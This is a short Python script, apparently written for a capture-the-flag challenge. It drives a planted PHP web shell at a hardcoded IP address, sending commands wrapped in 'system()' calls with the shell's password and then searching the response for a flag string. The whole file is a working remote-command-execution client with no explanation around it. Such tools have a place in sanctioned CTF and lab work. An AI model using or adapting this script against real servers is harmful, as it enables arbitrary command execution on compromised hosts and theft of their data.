import requests
import re

class Exploit:
    def __init__(self, target_url, timeout=10,password=None,parameter=None):
        self.target_url = target_url
        self.timeout = timeout
        self.password = password
        self.parameter = parameter
    def execute(self,command):
        data = {
            self.parameter : "system('{}');".format(command),
        }
        query= {
            "pass":self.password
        }
        # print(data)
        response = requests.post(self.target_url, timeout=self.timeout, data=data, params=query)
        return response.text
    def extract_flag(self,text,flag_pattern=r"flag\{[a-zA-Z0-9_-]+\}"):
        return re.findall(flag_pattern, text)



if __name__ == "__main__":
    exploit = Exploit("http://219.217.199.214:8300/shell.php", timeout=10,password="qyzy",parameter="cmd")
    res = exploit.execute("get /flag")
    print(res)
    print(exploit.extract_flag(res))

